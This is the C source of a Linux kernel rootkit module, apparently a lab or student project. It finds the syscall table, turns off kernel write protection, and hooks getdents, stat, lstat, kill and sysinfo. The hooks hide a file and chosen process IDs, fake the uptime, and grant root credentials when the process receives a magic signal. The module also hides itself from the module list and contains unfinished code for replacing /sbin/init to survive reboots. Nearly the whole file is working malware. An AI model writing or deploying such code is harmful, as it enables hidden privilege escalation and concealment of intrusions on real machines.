#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <linux/dirent.h>

#include "modify_syscalls.h"

#define DISABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~ 0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_enable(); \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);

#define START_ADDRESS 0xffffffff81000000
#define END_ADDRESS 0xffffffffa2000000
#define SYS_CALL_NUM 300

#define SIG_GIVE_ROOT 32
#define SIG_HIDE 33
#define SIG_UNHIDE 34
#define SIG_HIDEPID 35

// this is the filename we want to hide
// used in hacked_getdents(...)
#define TO_HIDE "test_file.txt"
char hidePID[6] = "-1";

// this is the c file which will replace /sbin/init
// - it loads the rootkit then runs the original /sbin/init
#define FILE_INIT_REPLACEMENT_C "start_rootkit.c"
// #define FILE_INIT               "/sbin/init"
// #define FILE_INIT_ORIGINAL      "/sbin/init_original"

#define FILE_INIT               "/vagrant/init_temp"
#define FILE_INIT_ORIGINAL      "/vagrant/init_temp_original"

asmlinkage int (*original_sysinfo)(struct sysinfo *);
asmlinkage int (*original_kill)(pid_t, int);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage int (*original_stat)(const char *path, struct stat *buf);
asmlinkage int (*original_lstat)(const char *path, struct stat *buf);

struct list_head *module_list;


void update_sys_calls(void **sys_call_table){
    void **modified_at_address_sysinfo = &sys_call_table[__NR_sysinfo];
    void *modified_function_sysinfo = hacked_sysinfo;
    void **modified_at_address_kill = &sys_call_table[__NR_kill];
    void *modified_function_kill = hacked_kill;
    void **modified_at_address_getdents = &sys_call_table[__NR_getdents];
    void *modified_function_getdents = hacked_getdents;
    void **modified_at_address_stat = &sys_call_table[__NR_stat];
    void *modified_function_stat = hacked_stat;
    void **modified_at_address_lstat = &sys_call_table[__NR_lstat];
    void *modified_function_lstat = hacked_lstat;

    DISABLE_W_PROTECTED_MEMORY
    original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
    original_kill = xchg(modified_at_address_kill, modified_function_kill);
    original_getdents = xchg(modified_at_address_getdents, modified_function_getdents);
    original_stat = xchg(modified_at_address_stat, modified_function_stat);
    original_lstat = xchg(modified_at_address_lstat, modified_function_lstat);
    ENABLE_W_PROTECTED_MEMORY
}

void revert_to_original(void **sys_call_table){
    void **modified_at_address_sysinfo = &sys_call_table[__NR_sysinfo];
    void *modified_function_sysinfo = original_sysinfo;
    void **modified_at_address_kill = &sys_call_table[__NR_kill];
    void *modified_function_kill = original_kill;
    void **modified_at_address_getdents = &sys_call_table[__NR_getdents];
    void *modified_function_getdents = original_getdents;
    void **modified_at_address_stat = &sys_call_table[__NR_stat];
    void *modified_function_stat = original_stat;
    void **modified_at_address_lstat = &sys_call_table[__NR_lstat];
    void *modified_function_lstat = original_lstat;

    DISABLE_W_PROTECTED_MEMORY
    original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
    original_kill = xchg(modified_at_address_kill, modified_function_kill);
    original_getdents = xchg(modified_at_address_getdents, modified_function_getdents);
    original_stat = xchg(modified_at_address_stat, modified_function_stat);
    original_lstat = xchg(modified_at_address_lstat, modified_function_lstat);
    ENABLE_W_PROTECTED_MEMORY
}

asmlinkage int hacked_sysinfo(struct sysinfo *info)
{
    original_sysinfo(info);
    info->uptime = 0;
    pr_info("System information modified!\n");
    return 0;
}

asmlinkage int hacked_kill(pid_t pid, int sig)
{
    struct task_struct *task;

    switch(sig) {
        case SIG_GIVE_ROOT:
            give_root();
            pr_info("Root priviledge given!\n");
            break;
        case SIG_HIDE:
            pr_info("Hiding the module!\n");
            hide();
            break;
        case SIG_UNHIDE:
            pr_info("Unhiding the module!\n");
            unhide();
            break;
        case SIG_HIDEPID:
            pr_info("Hiding the PID %d,\n",pid);
            sprintf(hidePID, "%d", pid);
            break;
        default:
            return original_kill(pid, sig);
    }
    return 0;
}

// code heavily inspired by:
// https://exploit.ph/linux-kernel-hacking/2014/07/10/system-call-hooking/
asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    // run the actual system call
    // (this returns the number of bytes read)
    int ret = original_getdents(fd, dirp, count);

    // loop through the returned struct
    struct linux_dirent *cur = dirp;
    int i = 0;
    while (i < ret) {
        // if we see the filename which we want to hide,
        // then modify the number of bytes read
        // & move on
        if (strncmp(cur->d_name, TO_HIDE, strlen(TO_HIDE)) == 0 || strncmp(cur->d_name, hidePID, strlen(hidePID)) == 0) {
            // length of the linux_dirent
            int reclen = cur->d_reclen;
            // calc. the next file/directory location
            char* next_rec = (char*) cur + reclen;

            //      = end location of our directory - next file/directory location
            long len = (long) dirp + ret - (long) next_rec;
            // move onto the next directory/file
            // (this copies bytes from next_rec into cur)
            memmove(cur, next_rec, len);
            // update our return value so it isn't suspicious
            ret -= reclen;
        } else {
            // we don't match -
            // move on to the next directory/file
            i += cur->d_reclen;
            cur = (struct linux_dirent*) ((char*) dirp + i);
        }
    }

    return ret;
}

// given a filename w/ path, replaces with just filename
// returns string w/o path
const char* strip_filepath(const char* filepath) {
    const char* loc = strrchr(filepath, '/');
    if (loc == NULL) {
        // there is no path - only a filename
        return filepath;
    } else {
        return loc + sizeof(char);
    }
}

// code heavily inspired by:
// https://exploit.ph/linux-kernel-hacking/2014/10/23/rootkit-for-hiding-files/index.html
// NOTE: this does not append 'No such file or directory' to the end;
// is the error code return working?
asmlinkage int hacked_stat(const char *path, struct stat *buf) {
    const char* filename = strip_filepath(path);
    if (strncmp(filename, TO_HIDE, strlen(TO_HIDE)) == 0) {
        return -ENOENT;
    } else {
        return original_stat(path, buf);
    }
}

asmlinkage int hacked_lstat(const char *path, struct stat *buf) {
    const char* filename = strip_filepath(path);
    if (strncmp(filename, TO_HIDE, strlen(TO_HIDE)) == 0) {
        return -ENOENT;
    } else {
        return original_lstat(path, buf);
    }
}

void give_root(void)
{
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (newcreds == NULL)
    	return;
    newcreds->uid = newcreds->gid = 0;
    newcreds->euid = newcreds->egid = 0;
    newcreds->suid = newcreds->sgid = 0;
    newcreds->fsuid = newcreds->fsgid = 0;
 
    commit_creds(newcreds);
}

void hide(void)
{
    module_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void unhide(void)
{
    list_add(&THIS_MODULE->list, module_list);
}

void **find_syscall_table(void)
{
    void **sctable;
    void *i = (void*) START_ADDRESS;

    while (i < (void*)END_ADDRESS) {
        sctable = (void **) i;
        // sadly only sys_close seems to be exported -- we can't check against more system calls
        if (sctable[__NR_close] == (void *) sys_close) {
        size_t j;
        // sanity check: no function pointer in the system call table should be NULL
        for (j = 0; j < SYS_CALL_NUM; j ++) {
            if (sctable[j] == NULL) {
                goto skip;
            }
        }
        return sctable;
        }
        skip:
        i += sizeof(void *);
    }

    return NULL;
}

// ref: https://www.linuxjournal.com/article/8110
//      https://en.it1352.com/article/bd12740c86574c22aff0e5b2b89680e4.html
// could have done this with function pointers? using lower level stuff tho
int clone_file(const char* filepath_1, const char* filepath_2) {
    int err;
    ssize_t f1_ret, f2_ret;
    unsigned char buf[1];

    // open first file for reading
    struct file *filp = NULL;

    mm_segment_t old_fs = get_fs();
    set_fs(get_ds());
    filp = filp_open(filepath_1, O_RDONLY, 0);

    if (IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    
    loff_t pos = filp->f_pos;
    f1_ret = vfs_read(filp, buf, 1, &pos);
    if (f1_ret > 0) {
        filp->f_pos = pos;
    }

    loff_t end = vfs_llseek(filp, 0, SEEK_END);


    // open second file for writing
    {
        struct file *filp_write = NULL;
        filp_write = filp_open(filepath_2, O_WRONLY | O_CREAT, 0);
        if (IS_ERR(filp_write)) {
            err = PTR_ERR(filp_write);
            return NULL;
        }

        loff_t pos_write = filp_write->f_pos;
        f2_ret = vfs_write(filp_write, buf, 1, &pos_write);
        if (f2_ret > 0) {
            filp->f_pos = pos;
        }

        filp_close(filp_write, NULL);
    }

    set_fs(old_fs);
    filp_close(filp, NULL);

    // int i;
    // for (i = 0; i < 5; i++) {
    //     printk("%c", buf[i]); 
    // }
    // printk("\n");

    return 0;
}

// most of this should only be executed on the first
// run (ideally)
// - should this be done in our payload instead?
//   doing file I/O is bad in kernel modules
void add_to_reboot() {
    clone_file("/home/vagrant/dog.txt", "/home/vagrant/dog_copy.txt");

    // check for existence of /sbin/init_original
    // if (!access(FILE_INIT_ORIGINAL, R_OK) == 0) {
        // no  -> copy /sbin/init -> /sbin/init_original
        
        // char copy_command[4 + strlen(FILE_INIT) + strlen(FILE_INIT_ORIGINAL)];
        // sprintf(copy_command, "cp %s %s", FILE_INIT, FILE_INIT_ORIGINAL);
        // int return_copy = system(copy_command);
        
        //     -> compile start_rootkit.c -> /sbin/init
        // char compile_command[8 + strlen(FILE_INIT_REPLACEMENT_C) + strlen(FILE_INIT)];
        // sprintf(compile_command, "gcc %s -o %s", FILE_INIT_REPLACEMENT_C, FILE_INIT);

        //     -> move our replacement init -> /sbin/init

    // }
}